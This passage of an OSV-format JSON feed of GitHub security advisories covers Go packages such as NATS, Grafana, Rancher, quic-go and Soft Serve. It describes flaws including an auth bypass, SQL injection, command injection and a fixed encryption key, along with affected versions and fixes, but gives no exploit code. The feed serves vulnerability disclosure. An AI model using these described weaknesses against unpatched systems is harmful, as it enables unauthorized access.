{"ecosystem": "Go", "name": "google.golang.org/grpc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.57.0"}, {"fixed": "1.57.1"}]}]}, {"package": {"ecosystem": "Go", "name": "google.golang.org/grpc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.58.0"}, {"fixed": "1.58.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/grpc/grpc-go/security/advisories/GHSA-m425-mq94-257g"}, {"type": "WEB", "url": "https://github.com/grpc/grpc-go/pull/6703"}, {"type": "WEB", "url": "https://github.com/grpc/grpc-go/commit/f2180b4d5403d2210b30b93098eb7da31c05c721"}, {"type": "PACKAGE", "url": "https://github.com/grpc/grpc-go"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-25T21:17:37Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-mr45-rx8q-wcm9", "modified": "2023-10-31T21:19:02Z", "published": "2023-10-31T21:19:02Z", "aliases": ["CVE-2023-46129"], "summary": "xkeys seal encryption used fixed key for all encryption", "details": "## Background\n\nNATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.\n\nThe cryptographic key handling library, nkeys, recently gained support for encryption, not just for signing/authentication.  This is used in nats-server 2.10 (Sep 2023) and newer for authentication callouts.\n\n## Problem Description\n\nThe nkeys library's \"xkeys\" encryption handling logic mistakenly passed an array by value into an internal function, where the function mutated that buffer to populate the encryption key to use.  As a result, all encryption was actually to an all-zeros key.\n\nThis affects encryption only, not signing.  \nFIXME: FILL IN IMPACT ON NATS-SERVER AUTH CALLOUT SECURITY.\n\n## Affected versions\n\nnkeys Go library:\n * 0.4.0 up to and including 0.4.5\n * Fixed with nats-io/nkeys: 0.4.6\n\nNATS Server:\n * 2.10.0 up to and including 2.10.3\n * Fixed with nats-io/nats-server: 2.10.4\n\n## Solution\n\nUpgrade the nats-server.  \nFor any application handling auth callouts in Go, if using the nkeys library, update the dependency, recompile and deploy that in lockstep.\n\n## Credits\n\nProblem reported by Quentin Matillat (GitHub @tinou98).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nats-io/nkeys"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.4.0"}, {"fixed": "0.4.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.4.5"}}, {"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-server/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.10.0"}, {"fixed": "2.10.4"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.10.3"}}], "references": [{"type": "WEB", "url": "https://github.com/nats-io/nkeys/security/advisories/GHSA-mr45-rx8q-wcm9"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-46129"}, {"type": "WEB", "url": "https://github.com/nats-io/nkeys/commit/58fb9d69f42ea73fffad1d14e5914dc666f3daa1"}, {"type": "PACKAGE", "url": "https://github.com/nats-io/nkeys"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/R3UETKPUB3V5JS5TLZOF3SMTGT5K5APS/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ULQQONMSCQSH5Z5OWFFQHCGEZ3NL4DRJ/"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2023/10/31/1"}], "database_specific": {"cwe_ids": ["CWE-321", "CWE-325"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-31T21:19:02Z", "nvd_published_at": "2023-10-31T00:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hmq4-c2r4-5q8h", "modified": "2023-10-19T19:35:45Z", "published": "2023-10-19T17:06:42Z", "aliases": ["CVE-2023-45823"], "summary": "Artifact Hub arbitrary file read vulnerability", "details": "### Impact\n\nDuring a security audit of Artifact Hub's code base, a security researcher at [OffSec](https://www.offsec.com/) identified a bug in which by using symbolic links in certain kinds of repositories loaded into Artifact Hub, it was possible to read internal files.\n\nArtifact Hub indexes content from a variety of sources, including git repositories. When processing git based repositories, Artifact Hub clones the repository and, depending on the artifact kind, reads some files from it. During this process, in some cases, no validation was done to check if the file was a symbolic link. This made possible to read arbitrary files in the system, potentially leaking sensitive information.\n\n### Patches\n\nThis issue has been resolved in version [1.16.0](https://artifacthub.io/packages/helm/artifact-hub/artifact-hub?modal=changelog&version=1.16.0).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/artifacthub/hub"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.16.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/artifacthub/hub/security/advisories/GHSA-hmq4-c2r4-5q8h"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-45823"}, {"type": "WEB", "url": "https://artifacthub.io/packages/helm/artifact-hub/artifact-hub?modal=changelog&version=1.16.0"}, {"type": "PACKAGE", "url": "https://github.com/artifacthub/hub"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-19T17:06:42Z", "nvd_published_at": "2023-10-19T21:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r847-6w6h-r8g4", "modified": "2023-10-27T17:39:08Z", "published": "2023-10-27T17:39:08Z", "aliases": ["CVE-2023-41891"], "summary": "Flyte Admin SQL Injection in List Filters", "details": "### Impact\nList endpoints on Flyte Admin has a SQL vulnerability where a malicious user can send a REST requests with custom SQL statements as list filters.\n\n### Workarounds\nThe attacker needs to have access to the flyteadmin installation (typically either behind a VPN or authentication).\n\n### References\nhttps://owasp.org/www-community/attacks/SQL_Injection#\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/flyteorg/flyteadmin"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.124"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/flyteorg/flyteadmin/security/advisories/GHSA-r847-6w6h-r8g4"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-41891"}, {"type": "WEB", "url": "https://github.com/flyteorg/flyteadmin/commit/b3177ef70f068e908140b8a4a9913dfa74f289fd"}, {"type": "PACKAGE", "url": "https://github.com/flyteorg/flyteadmin"}, {"type": "WEB", "url": "https://owasp.org/www-community/attacks/SQL_Injection#"}], "database_specific": {"cwe_ids": ["CWE-89"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-10-27T17:39:08Z", "nvd_published_at": "2023-10-30T19:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3q6m-v84f-6p9h", "modified": "2023-11-01T06:07:08Z", "published": "2023-10-30T15:08:05Z", "aliases": ["CVE-2023-46239"], "summary": "quic-go vulnerable to pointer dereference that can lead to panic", "details": "quic-go is an implementation of the [QUIC](https://datatracker.ietf.org/doc/html/rfc9000) transport protocol in Go. By serializing an ACK frame after the CRYTPO that allows a node to complete the handshake, a remote node could trigger a nil pointer dereference (leading to a panic) when the node attempted to drop the Handshake packet number space.\n\n**Impact**\n\nAn attacker can bring down a quic-go node with very minimal effort. Completing the QUIC handshake only requires sending and receiving a few packets.\n\n**Patches**\n\n[v0.37.3](https://github.com/quic-go/quic-go/releases/tag/v0.37.3) contains a patch. Versions before v0.37.0 are not affected.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/quic-go/quic-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.37.0"}, {"fixed": "0.37.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/quic-go/quic-go/security/advisories/GHSA-3q6m-v84f-6p9h"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-46239"}, {"type": "WEB", "url": "https://github.com/quic-go/quic-go/commit/b6a4725b60f1fe04e8f1ddcc3114e290fcea1617"}, {"type": "PACKAGE", "url": "https://github.com/quic-go/quic-go"}, {"type": "WEB", "url": "https://github.com/quic-go/quic-go/releases/tag/v0.37.3"}], "database_specific": {"cwe_ids": ["CWE-248", "CWE-476"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-30T15:08:05Z", "nvd_published_at": "2023-10-31T16:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7v4p-328v-8v5g", "modified": "2023-10-17T02:37:42Z", "published": "2023-10-17T02:37:42Z", "aliases": [], "summary": "Traefik vulnerable to HTTP/2 request causing denial of service ", "details": "### Impact\n\nA vulnerability CVE-2023-39325 exists in [Go managing HTTP/2 requests](https://groups.google.com/g/golang-announce/c/iNNxDTCjZvo/m/UDd7VKQuAAAJ?pli=1), which impacts Traefik. This vulnerability could be exploited to cause a denial of service.\n\n### References\n\n- [CVE-2023-44487](https://www.cve.org/CVERecord?id=CVE-2023-44487)\n- [CVE-2023-39325](https://www.cve.org/CVERecord?id=CVE-2023-39325)\n\n### Patches\n\n- https://github.com/traefik/traefik/releases/tag/v2.10.5\n- https://github.com/traefik/traefik/releases/tag/v3.0.0-beta4", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.10.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0-beta1"}, {"fixed": "3.0.0-beta4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/traefik/traefik/security/advisories/GHSA-7v4p-328v-8v5g"}, {"type": "PACKAGE", "url": "https://github.com/traefik/traefik"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/iNNxDTCjZvo/m/UDd7VKQuAAAJ?pli=1"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-10-17T02:37:42Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-mc97-99j4-vm2v", "modified": "2023-10-04T22:13:08Z", "published": "2023-10-02T23:30:39Z", "aliases": ["CVE-2023-43809"], "summary": "Soft Serve Public Key Authentication Bypass Vulnerability when Keyboard-Interactive SSH Authentication is Enabled", "details": "### Impact\n\nA security vulnerability in Soft Serve could allow an unauthenticated, remote attacker to bypass public key authentication when keyboard-interactive SSH authentication is active, through the `allow-keyless` setting, and the public key requires additional client-side verification for example using FIDO2 or GPG. This is due to insufficient validation procedures of the public key step during SSH request handshake, granting unauthorized access if the keyboard-interaction mode is utilized. An attacker could exploit this vulnerability by presenting manipulated SSH requests using keyboard-interactive authentication mode. This could potentially result in unauthorized access to the Soft Serve.\n\n### Patches\n\nUsers should upgrade to the latest Soft Serve version `v0.6.2` to receive the patch for this issue. \n\n### Workarounds\n\nTo workaround this vulnerability without upgrading, users can _temporarily_ disable Keyboard-Interactive SSH Authentication using the `allow-keyless` setting.\n\n### References\n\nhttps://github.com/charmbracelet/soft-serve/issues/389", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/charmbracelet/soft-serve"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.6.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/charmbracelet/soft-serve/security/advisories/GHSA-mc97-99j4-vm2v"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43809"}, {"type": "WEB", "url": "https://github.com/charmbracelet/soft-serve/issues/389"}, {"type": "WEB", "url": "https://github.com/charmbracelet/soft-serve/commit/407c4ec72d1006cee1ff8c1775e5bcc091c2bc89"}, {"type": "PACKAGE", "url": "https://github.com/charmbracelet/soft-serve"}, {"type": "WEB", "url": "https://github.com/charmbracelet/soft-serve/releases/tag/v0.6.2"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-02T23:30:39Z", "nvd_published_at": "2023-10-04T21:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gvrm-w2f9-f77q", "modified": "2023-11-03T19:13:43Z", "published": "2023-10-25T21:30:32Z", "aliases": ["CVE-2022-4886"], "summary": "Ingress-nginx path sanitization can be bypassed", "details": "Ingress-nginx `path` sanitization can be bypassed with `log_format` directive.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/ingress-nginx"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.8.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4886"}, {"type": "WEB", "url": "https://github.com/kubernetes/ingress-nginx/issues/10570"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/ingress-nginx"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/ge7u3qCwZLI"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2023/10/25/5"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-11-03T19:13:43Z", "nvd_published_at": "2023-10-25T20:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fr2g-9hjm-wr23", "modified": "2023-10-31T22:24:58Z", "published": "2023-10-19T16:13:03Z", "aliases": ["CVE-2023-47090"], "summary": "NATS.io: Adding accounts for just the system account adds auth bypass", "details": "## Background\n\nNATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.\n\nNATS users exist within accounts, and once using accounts, the old authorization block is not applicable.\n\n\n## Problem Description\n\nWithout any authorization rules in the nats-server, users can connect without authentication.\n\nBefore nats-server 2.2.0, all authentication and authorization rules for a nats-server lived in an \"authorization\" block, defining users.  With nats-server 2.2.0 all users live inside accounts.  When using the authorization block, whose syntax predates this, those users will be placed into the implicit global account, \"$G\".  Users inside accounts go into the newer \"accounts\" block.\n\nIf an \"accounts\" block is defined, in simple deployment scenarios this is often used only to enable client access to the system account.  When the only account added is the system account \"$SYS\", the nats-server would create an implicit user in \"$G\" and set it as the `no_auth_user` account, enabling the same \"without authentication\" logic as without any rules.\n\nThis preserved the ability to connect simply, and then add one authenticated login for system access.\n\nBut with an \"authorization\" block, this is wrong.  Users exist in the global account, with login rules.  And in simple testing, they might still connect fine without administrators seeing that authentication has been disabled.\n\nThe blind-spot on our part came from encouraging and documenting a switch to using only \"accounts\", instead of \"authorization\".\n\nIn the fixed versions, using an \"authorization\" block will inhibit the implicit creation of a \"$G\" user and setting it as the `no_auth_user` target.  In unfixed versions, just creating a second account, with no users, will also inhibit this behavior.\n\n\n## Affected versions\n\nNATS Server:\n * 2.2.0 up to and including 2.9.22 and 2.10.1\n * Fixed with nats-io/nats-server: 2.10.2 and backported to 2.9.23\n\n\n## Workarounds\n\nIn the \"accounts\" block, define a second non-system account, leave it empty.\n\n    accounts {\n        SYS: {\n            users: [\n                { user: sysuser, password: makemeasandwich }\n            ]\n        }\n        DUMMY: {}  # for security, before 2.10.2\n    }\n    system_account: SYS\n\n\n## Solution\n\nAny one of these:\n\n 1. Upgrade the NATS server to at least 2.10.2 (or 2.9.23)\n 2. Or define a dummy account\n 3. Or complete the migration of authorization entries to be inside a named account in the \"accounts\" block\n\n\n## Credits\n\nProblem reported by Alex Herrington.  \nAddressed publicly in a GitHub Discussion prior to this advisory.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-server/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.9.23"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-server/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.10.0"}, {"fixed": "2.10.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/nats-io/nats-server/security/advisories/GHSA-fr2g-9hjm-wr23"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/pull/4605"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/commit/fa5b7afcb64e7e887e49afdd032358802b5c4478"}, {"type": "WEB", "url": "https://advisories.nats.io/CVE/secnote-2023-01.txt"}, {"type": "PACKAGE", "url": "https://github.com/nats-io/nats-server"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/discussions/4535"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/releases/tag/v2.10.2"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/releases/tag/v2.9.23"}], "database_specific": {"cwe_ids": ["CWE-305"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-19T16:13:03Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-fw9c-75hh-89p6", "modified": "2023-10-20T22:58:47Z", "published": "2023-10-16T09:30:19Z", "aliases": ["CVE-2023-4822"], "summary": "Grafana privilege escalation vulnerability", "details": "Grafana is an open-source platform for monitoring and observability. The vulnerability impacts instances with several organizations, and allows a user with Organization Admin permissions in one organization to change the permissions associated with Organization Viewer, Organization Editor and Organization Admin roles in all organizations.\n\nIt also allows an Organization Admin to assign or revoke any permissions that they have to any user globally.\n\nThis means that any Organization Admin can elevate their own permissions in any organization that they are already a member of, or elevate or restrict the permissions of any other user.\n\nThe vulnerability does not allow a user to become a member of an organization that they are not already a member of, or to add any other users to an organization that the current user is not a member of.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "10.1.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4822"}, {"type": "PACKAGE", "url": "https://github.com/grafana/grafana"}, {"type": "WEB", "url": "https://grafana.com/security/security-advisories/cve-2023-4822"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20231103-0008/"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-10-17T20:23:50Z", "nvd_published_at": "2023-10-16T09:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-37x5-qpm8-53rq", "modified": "2023-10-20T23:27:36Z", "published": "2023-10-16T12:33:36Z", "aliases": ["CVE-2023-4457"], "summary": "Google Sheets data source plugin for Grafana information disclosure vulnerability", "details": "Grafana is an open-source platform for monitoring and observability.\n\nThe Google Sheets data source plugin for Grafana, versions 0.9.0 to 1.2.2 are vulnerable to an information disclosure vulnerability.\n\nThe plugin did not properly sanitize error messages, making it potentially expose the Google Sheet API-key that is configured for the data source.\n\nThis vulnerability was fixed in version 1.2.2.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/google-sheets-datasource"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.9.0"}, {"fixed": "1.2.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4457"}, {"type": "PACKAGE", "url": "https://github.com/grafana/google-sheets-datasource"}, {"type": "WEB", "url": "https://grafana.com/security/security-advisories/cve-2023-4457/"}], "database_specific": {"cwe_ids": ["CWE-209"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-10-20T23:27:36Z", "nvd_published_at": "2023-10-16T10:15:12Z"}}, {"schema_version": "1.4.0", "id": "GHSA-34p5-jp77-fcrc", "modified": "2023-02-15T18:37:48Z", "published": "2023-01-25T19:36:35Z", "aliases": ["CVE-2022-43758"], "summary": "Command injection in Rancher Git package", "details": "### Impact\n\nAn issue was discovered in Rancher from versions 2.5.0 up to and including 2.5.16, 2.6.0 up to and including 2.6.9 and 2.7.0, where a command injection vulnerability is present in the Rancher Git package. This package uses the underlying Git binary available in the Rancher container image to execute Git operations.\n\nSpecially crafted commands, when not properly disambiguated, can cause confusion when executed through Git, resulting in command injection in the underlying Rancher host.\n\nThis issue can potentially be exploited in Rancher in two ways:\n\n1. Adding an untrusted Helm catalog, in the Catalogs menu, that contains maliciously designed repo URL configuration in Helm charts.\n2. Modifying the URL configuration used to download KDM (Kontainer Driver Metadata) releases.\n\nBy default, only the Rancher admin has permission to manage both configurations for the local cluster (the cluster where Rancher is provisioned).\n\nNote: More information about this category of issue in version control system (VCS) tools are available in Snyk's [blog post](https://snyk.io/blog/argument-injection-when-using-git-and-mercurial/).\n\n### Workarounds\n\nExcept for only adding trusted catalogs and the KDM URL to Rancher, there is no other workaround besides updating Rancher to a patched version.\n\n### Patches\n\nPatched versions include releases 2.5.17, 2.6.10, 2.7.1 and later versions.\n\nIt is also important to update to a patched version in case Rancher or its standalone Git package implementation is used as a Go library instead of the application itself. Otherwise, this vulnerability might affect your dependent code.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0"}, {"fixed": "2.5.17"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0"}, {"fixed": "2.6.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.7.0"}, {"fixed": "2.7.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/rancher/rancher/security/advisories/GHSA-34p5-jp77-fcrc"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-43758"}, {"type": "WEB", "url": "https://bugzilla.suse.com/show_bug.cgi?id=1205294"}, {"type": "PACKAGE", "url": "https://github.com/rancher/rancher"}], "database_specific": {"cwe_ids": ["CWE-77", "CWE-78", "CWE-88"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-25T19:36:35Z", "nvd_published_at": "2023-02-07T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c45c-39f6-6gw9", "modified": "2023-01-25T19:38:13Z", "published": "2023-01-25T19:38:13Z", "aliases": [], "summary": "Rancher generated tokens not revoked after modifications made to authentication provider", "details": "### Impact\n\nThis issue affects Rancher versions from 2.5.0 up to and including 2.5.16, from 2.6.0 up to and including 2.6.9 and 2.7.0. It only affects Rancher setups that have an external [authentication provider](https://ranchermanager.docs.rancher.com/pages-for-subheaders/authentication-config) configured or had one configured in the past.\n\nIt was discovered that when an external authentication provider is configured in Rancher and then disabled, the Rancher generated [tokens](https://ranchermanager.docs.rancher.com/reference-guides/about-the-api/api-tokens) associated with users who had access granted through the now disabled auth provider are not revoked. This allows users to retain access to Rancher and `kubectl` access to clusters managed by Rancher, according to their previous configured permissions, even after they are supposed to have lost it due to the auth provider been disabled.\n\nThe problem also occurs if the auth provider is configured (and is still enabled) to use the [access level scopes](https://ranchermanager.docs.rancher.com/pages-for-subheaders/authentication-config) `allow members of clusters and projects, plus authorized users & groups` and `restrict access to only the authorized users & groups`. In this case, removing users and groups from the authorized lists will not revoke the access tokens and they will remain valid.\n\n\nAn example scenario is:\n\n1. OpenLDAP, MS Active Directory (AD) or any other external [authentication provider](https://ranchermanager.docs.rancher.com/pages-for-subheaders/authentication-config) is configured as an auth provider.\n2. A user (`cluster-owner`) is granted `cluster-owner` permissions on a downstream cluster (`test-cluster`).\n3. `cluster-owner` logs in using their external auth provider username and password.\n4. `cluster-owner` generates a `kubeconfig` token for `test-cluster`.\n5. The configured external auth provider is disabled.\n\nIn this scenario, the `kubeconfig` generated in step 4 will still be valid after step 5, and `test-cluster` can still be accessed using the `kubeconfig` token.\n\nBy default, tokens for authenticated session have their `ttl` (time to live) set to `960` minutes, so they will expire after `16` hours. `kubeconfig` tokens are configured to never expire, and their `ttl` is set to `0`. These configurations can be changed in the Rancher's settings (`Configuration > Global Settings > Settings`) with the [parameters](https://ranchermanager.docs.rancher.com/reference-guides/about-the-api/api-tokens)  `auth-user-session-ttl-minutes` and `kubeconfig-default-token-ttl-minutes`, respectively.\n\n### Workarounds\n\nIf you cannot update to a patched Rancher version, the recommended workaround is to review and remove tokens associated with auth providers manually.\n\nThe tokens can be reviewed by executing `kubectl get tokens` in Rancher's `local` cluster. Each found token must be manually reviewed to check if it belongs to a user from a disabled auth provider or a user who's access was previously removed from the auth provider (when the auth provider is still enabled and is or was configured to use access level scopes, as mentioned above). The identified tokens can be removed with `kubectl delete tokens <token_name>`.\n\nIt is important to mention that this workaround must be done every time an auth provider is disabled in case you cannot update to a patched version.\n\n### Patches\n\nPatched versions include releases 2.5.17, 2.6.10, 2.7.1 and later versions. After updating to a patched version, it is highly recommended to review the existing tokens and remove tokens related to disabled auth providers as described above in the workaround section.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0"}, {"fixed": "2.5.17"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0"}, {"fixed": "2.6.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.7.0"}, {"fixed": "2.7.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/rancher/rancher/security/advisories/GHSA-c45c-39f6-6gw9"}, {"type": "PACKAGE", "url": "https://github.com/rancher/rancher"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-25T19:38:13Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-3hc7-2xcc-7p8f", "modified": "2023-01-12T23:44:02Z", "published": "2023-01-07T21:30:40Z", "aliases": ["CVE-2020-36645"], "summary": "Squalor SQL Injection vulnerability", "details": "A vulnerability, which was classified as critical, was found in square squalor. This affects an unknown part. The manipulation leads to sql injection. Upgrading to version v0.0.0 is able to address this issue. The name of the patch is f6f0a47cc344711042eb0970cb423e6950ba3f93. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-217623.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/square/squalor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-36645"}, {"type": "WEB", "url": "https://github.com/square/squalor/pull/76"}, {"type": "WEB", "url": "https://github.com/square/squalor/commit/f6f0a47cc344711042eb0970cb423e6950ba3f93"}, {"type": "PACKAGE", "url": "https://github.com/square/squalor"}, {"type": "WEB", "url": "https://github.com/square/squalor/releases/tag/v0.0.0"}, {"type": "WEB", "url": "https://vuldb.com/?ctiid.217623"}, {"type": "WEB", "url": "https://vuldb.com/?id.217623"}], "database_specific": {"cwe_ids": ["CWE-89"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-01-12T23:44:02Z", "nvd_published_at": "2023-01-07T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h2ph-9r76-37v5", "modified": "2023-01-12T16:47:52Z", "published": "2023-01-07T06:30:19Z", "aliases": ["CVE-2023-0111"], "summary": "usememos/memos vulnerable to stored Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository usememos/memos prior to 0.10.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": 